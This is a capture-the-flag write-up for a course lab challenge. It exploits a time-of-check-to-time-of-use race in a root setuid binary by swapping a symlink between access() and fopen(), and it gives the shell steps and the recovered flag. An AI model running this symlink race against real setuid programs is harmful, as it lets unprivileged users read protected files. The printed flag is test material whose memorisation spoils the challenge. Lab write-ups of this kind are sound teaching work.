# Challenge `I challenge you for a race` writeup

* **Flag:** `SSof{Time_of_Check_Time_of_Use_or_toctou_racing_ftw}`
* **Vulnerability:** Time-Of-Check to Time-Of-Use (TOCTOU) Race Condition
* **Where:** Local setuid binary `/challenge/challenge`, which has the setuid bit set and is owned by root, so it runs with elevated privileges.
* **Impact:** Allows reading files without permission, including `/challenge/flag`
* **NOTE:** The vulnerability exists due to the unsafe use of `access()` before `fopen()`.

---

## Steps to reproduce

1. Connect to the server:

```bash
ssh SSof_70@mustard.stt.rnl.tecnico.ulisboa.pt -p 25651
```

2. Inspect the challenge directory and confirm permissions:

```bash
ls -la /challenge
```

3. Create a private directory in `/tmp`:

```bash
mkdir /tmp/dummydir
cd /tmp/dummydir
touch dummy
```

4. Repeatedly create a symbolic link to a safe file and execute the vulnerable program:

```bash
ln -s dummy pointer
/challenge/challenge pointer
```

5. Between the permission check and the file open, replace the symlink with the protected file:

```bash
rm pointer
ln -s /challenge/flag pointer
```

6. Repeat the process until the race condition succeeds.

7. The contents of `/challenge/flag` are eventually printed to the screen.

[(POC)](I_challenge_you_for_a_race_poc.py)